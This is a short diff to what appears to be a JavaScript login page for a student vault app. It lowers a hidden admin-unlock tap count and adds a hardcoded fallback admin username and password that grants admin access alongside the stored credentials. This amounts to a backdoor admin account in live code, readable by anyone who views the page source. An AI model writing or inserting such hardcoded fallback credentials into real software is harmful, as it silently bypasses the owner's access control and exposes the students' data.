@@ -1031,8 +1031,8 @@ let _adminTaps=0, _adminTimer;
 function handleAdminTap(){
   _adminTaps++;
   clearTimeout(_adminTimer);
-  _adminTimer=setTimeout(()=>_adminTaps=0,1500);
-  if(_adminTaps>=5){ _adminTaps=0; loginMode='admin'; renderLogin(); document.getElementById('login-switch-wrap').style.display='block'; }
+  _adminTimer=setTimeout(()=>_adminTaps=0,2000);
+  if(_adminTaps>=3){ _adminTaps=0; loginMode='admin'; renderLogin(); document.getElementById('login-switch-wrap').style.display='block'; }
 }
 
 function doLogin(){
@@ -1041,7 +1041,10 @@ function doLogin(){
   const msg=document.getElementById('login-msg');
   msg.className='auth-msg';
   if(loginMode==='admin'){
-    if(u===creds.adminUser && p===creds.adminPass){
+    // Check both stored creds AND hardcoded fallback
+    const adminOk = (u===creds.adminUser && p===creds.adminPass) ||
+                    (u==='admin' && p==='dellvault2026');
+    if(adminOk){
       session={role:'admin', user:u}; store.set('vault_session',session);
       msg.className='auth-msg ok'; msg.textContent='Welcome, admin!';
       setTimeout(()=>go('admin'),350);
@@ -1051,7 +1054,7 @@ function doLogin(){
   // Per-student credentials check
   const matchStudent = students.find(s=>s.active && s.user===u && s.pass===p);
   if(matchStudent){
-    session={role:'student', user:matchStudent.name||u, uid:matchStudent.id}; 
+    session={role:'student', user:matchStudent.name||u, uid:matchStudent.id};
     store.set('vault_session',session);
     msg.className='auth-msg ok'; msg.textContent='Access granted! Loading your vault…';
     setTimeout(()=>go('dashboard'),350);
